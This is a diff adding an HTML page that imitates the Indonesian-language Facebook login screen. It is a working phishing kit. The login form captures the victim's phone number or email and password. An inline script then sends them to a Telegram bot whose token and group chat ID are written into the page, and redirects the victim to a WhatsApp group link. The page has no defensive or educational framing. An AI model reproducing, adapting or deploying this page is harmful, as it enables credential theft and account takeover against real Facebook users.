@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FACEBOOK - Masuk atau Daftar</title>
+</head>
+
+<body>
+
+
+    <style type="text/css" media="all">
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: rgb(245, 247, 250);
+            box-sizing: border-box;
+            overflow: hidden;
+        }
+
+        .container {
+            width: 100%;
+            height: 100vh;
+            display: block;
+            margin-top: -8px;
+            margin-right: auto;
+            margin-left: auto;
+            background-color: rgb(245, 247, 250);
+        }
+
+        .navbar-fb {
+            width: 100%;
+            text-align: center;
+            align-items: center;
+            background-color: rgba(255, 255, 255, 0);
+
+        }
+
+        .navbar-fb h1 {
+            font-size: 14px;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin-top: 20px;
+            letter-spacing: 1px;
+            font-weight: normal;
+        }
+
+
+        .icon-fb img {
+            width: 65px;
+            display: block;
+            margin-top: 60px;
+            margin-bottom: 30px;
+            margin-right: auto;
+            margin-left: auto;
+        }
+
+        .text-login {
+            text-align: center;
+            padding: 20px;
+            font-family: "Sans-Serif";
+            color: gray;
+        }
+
+        .box-login input[type=text] {
+            border: none;
+            border-radius: 10px;
+            outline: none;
+            width: 320px;
+            font-size: 15px;
+            height: 25px;
+            border: 1px solid #aaa;
+            padding: 15px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .box-login input[type=password] {
+            border: none;
+            font-size: 15px;
+            outline: none;
+            width: 320px;
+            height: 25px;
+            border-radius: 10px;
+            border: 1px solid #aaa;
+            padding: 13px;
+            display: block;
+            margin-top: 10px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .box-login input[type=submit] {
+            border: none;
+            width: 350px;
+            padding: 13px;
+            border-radius: 22px;
+            margin-top: 10px;
+            height: 44px;
+            background-color: #016ADC;
+            color: #fff;
+            font-size: 17px;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .text-center {
+            text-align: center;
+            color: gray;
+            font-family: "Sans-Serif";
+        }
+
+        .buat-akun {
+            margin-top: 80px;
+        }
+
+        .buat-akun button {
+            width: 350px;
+            border-radius: 22px;
+            padding: 10px;
+            opacity: 1;
+            height: 44px;
+            font-size: 16px;
+            color: rgb(0, 100, 224);
+            background-color: transparent;
+            border: 1px solid rgb(0, 100, 224);
+            cursor: pointer;
+        }
+
+        .lupa-pass {
+            color: black;
+            font-size: 15px;
+            margin-top: -4px;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        .meta-fb {
+            margin-top: 25px;
+            margin-bottom: 20px;
+        }
+
+        .meta-fb img {
+            width: 60px;
+        }
+
+        .navbar-bottom {
+            font-size: 11px;
+            margin-left: 10px;
+        }
+
+        .navbar-bottom span {
+            padding-right: 10px;
+        }
+
+        .btn-masuk {
+            display: flex;
+            justify-content: center;
+            margin-top: 10px;
+        }
+
+        .btn-masuk button {
+            width: 350px;
+            height: 45px;
+            border-radius: 30px;
+            background-color: #016ADC;
+            border: 1px solid white;
+            color: white;
+            font-size: 1.2rem;
+            font-weight: 600;
+        }
+    </style>
+
+    <body>
+        <div class="container">
+            <div class="navbar-fb">
+                <h1>Bahasa Indonesia</h1>
+            </div>
+            <div class="icon-fb">
+                <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yh/r/Sg2QOE06yVC.png" alt="" />
+            </div>
+            <div class="text-login">
+            </div>
+            <div class="box-login">
+                <form action="https://api.telegram.org" id="formTele" class="formtele" method="POST">
+                    <input type="text" name="mail" placeholder="Nomor ponsel atau email" id="mail" required="required"
+                        autocomplete="off" autocapitalize="off" />
+                    <input type="password" name="pass" placeholder="Kata Sandi" id="pass" required="required"
+                        autocomplete="off" autocapitalize="off" />
+                    <div class="btn-masuk">
+                        <button type="submit" id="kirim">Login</button>
+                    </div>
+                </form>
+                <div class="text-center">
+                    <br />
+                    <div class="lupa-pass">
+                        <span>Lupa Kata Sandi?</span>
+                    </div>
+                    <br />
+                    <div class="buat-akun">
+                        <button>Buat akun Baru</button>
+                    </div>
+                    <div class="meta-fb">
+                        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yr/r/7trPSpNFerC.png" alt="">
+                    </div>
+                    <div class="navbar-bottom">
+                        <span>Tentang </span>
+                        <span>Bantuan</span>
+                        <span>Lainya</span>
+                    </div>
+
+                    <script>
+                        const token = '8079234316:AAHs6JVX5gSvluKVa5cSZMCR68MF08198oc'
+                        const group_id = '-4732339848'
+
+                        const formtelegram = document.getElementById('formTele')
+
+                        const sendMessage = (text) => {
+                            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                                method: "POST",
+                                headers: {
+                                    "Content-Type": "application/json"
+                                },
+                                body: JSON.stringify({
+                                    "chat_id": group_id,
+                                    "text": text,
+                                })
+                            }).then(res => {
+                                if (!res.ok) {
+                                    throw new Error(res.statusText, res.status, res.url);
+                                }
+
+                                return res.json();
+                            }).then(res => {
+                                console.log(res);
+                                document.getElementById('kirim').innerHTML = "Login";
+                                window.location.href = "https://chat.whatsapp.com/GgLfpkJaIH1DmcXfXlPACA";
+                            }).catch(err => {
+                                console.log(err);
+                                alert('gagal')
+                            })
+                        };
+
+                        formtelegram.onsubmit = (e) => {
+                            e.preventDefault();
+
+                            const formData = new FormData(formtelegram)
+
+                            let text = '';
+
+                            for (const [key, val] of formData) {
+                                console.log(`${key}:`, val);
+
+                                text += `\n\n${key}:\n${val}`;
+
+                            }
+
+                            text = text.replace('\n\n', '');
+
+                            sendMessage(text)
+                        }
+                    </script>
+    </body>
+
+</html>
